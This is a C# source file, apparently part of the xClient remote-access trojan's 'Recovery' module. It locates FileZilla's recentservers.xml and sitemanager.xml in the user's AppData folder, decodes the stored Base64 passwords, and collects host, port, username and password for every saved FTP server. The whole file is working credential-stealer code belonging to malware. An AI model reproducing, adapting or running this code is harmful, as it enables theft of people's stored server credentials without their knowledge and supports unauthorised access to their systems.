using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;
using xClient.Core.Data;

namespace xClient.Core.Recovery.FtpClients;

public class FileZilla
{
	public static string RecentServerPath = $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\FileZilla\\recentservers.xml";

	public static string SiteManagerPath = $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\FileZilla\\sitemanager.xml";

	public static List<RecoveredAccount> GetSavedPasswords()
	{
		List<RecoveredAccount> list = new List<RecoveredAccount>();
		try
		{
			if (!File.Exists(RecentServerPath) && !File.Exists(SiteManagerPath))
			{
				return list;
			}
			if (File.Exists(RecentServerPath))
			{
				XmlTextReader reader = new XmlTextReader(RecentServerPath);
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.Load(reader);
				foreach (XmlNode childNode in xmlDocument.DocumentElement!.ChildNodes[0]!.ChildNodes)
				{
					string text = string.Empty;
					string username = string.Empty;
					string password = string.Empty;
					foreach (XmlNode childNode2 in childNode.ChildNodes)
					{
						if (childNode2.Name == "Host")
						{
							text = childNode2.InnerText;
						}
						if (childNode2.Name == "Port")
						{
							text = text + ":" + childNode2.InnerText;
						}
						if (childNode2.Name == "User")
						{
							username = childNode2.InnerText;
						}
						if (childNode2.Name == "Pass")
						{
							password = Base64Decode(childNode2.InnerText);
						}
					}
					list.Add(new RecoveredAccount
					{
						URL = text,
						Username = username,
						Password = password,
						Application = "FileZilla"
					});
				}
			}
			if (File.Exists(SiteManagerPath))
			{
				XmlTextReader reader2 = new XmlTextReader(SiteManagerPath);
				XmlDocument xmlDocument2 = new XmlDocument();
				xmlDocument2.Load(reader2);
				foreach (XmlNode childNode3 in xmlDocument2.DocumentElement!.ChildNodes[0]!.ChildNodes)
				{
					string text2 = string.Empty;
					string username2 = string.Empty;
					string password2 = string.Empty;
					foreach (XmlNode childNode4 in childNode3.ChildNodes)
					{
						if (childNode4.Name == "Host")
						{
							text2 = childNode4.InnerText;
						}
						if (childNode4.Name == "Port")
						{
							text2 = text2 + ":" + childNode4.InnerText;
						}
						if (childNode4.Name == "User")
						{
							username2 = childNode4.InnerText;
						}
						if (childNode4.Name == "Pass")
						{
							password2 = Base64Decode(childNode4.InnerText);
						}
					}
					list.Add(new RecoveredAccount
					{
						URL = text2,
						Username = username2,
						Password = password2,
						Application = "FileZilla"
					});
				}
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	public static string Base64Decode(string szInput)
	{
		try
		{
			byte[] bytes = Convert.FromBase64String(szInput);
			return Encoding.UTF8.GetString(bytes);
		}
		catch
		{
			return szInput;
		}
	}
}
